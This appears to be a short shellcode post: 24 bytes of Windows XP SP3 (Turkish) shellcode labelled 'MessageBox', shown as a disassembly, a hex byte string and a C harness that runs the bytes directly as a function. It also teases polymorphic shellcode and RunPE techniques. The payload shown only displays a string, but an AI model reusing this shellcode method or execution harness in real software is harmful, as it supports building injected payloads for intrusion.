win32/xp[TR] sp3  MessageBox - 24Bytes

#Greetz : Bomberman&T-Rex
#Author : B3mB4m
#Proof  : http://imgur.com/727ALiY

I know there is nothing new.I wrote just to say  "I am back" ..

-Coming soon-
   arwin.c [v2] ..
   Polymorphic shellcodes ..
   Win7,Win8,Win10 shellcodes ..
   RunPE & Migrate ? !!(If bomberman allowed hehe)

Stay tuned ! :)



Disassembly of section .text:

00401000 <_start>:
  401000:       31 c0                   xor    %eax,%eax
  401002:       50                      push   %eax
  401003:       68 42 34 6d 7c          push   $0x7c6d3442
  401008:       68 7c 42 33 6d          push   $0x6d33427c
  40100d:       89 e1                   mov    %esp,%ecx
  40100f:       bb d4 29 86 7c          mov    $0x7c8629d4,%ebx
  401014:       51                      push   %ecx
  401015:       50                      push   %eax
  401016:       ff d3                   call   %ebx



#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68\x42\x34\x6d\x7c\x68\x7c\x42\x33\x6d\x89\xe1\xbb\xd4\x29\x86\x7c\x51\x50\xff\xd3";

int main(int argc, char **argv){

	int (*func)();
	func = (int (*)()) shellcode;
	(int)(*func)();
}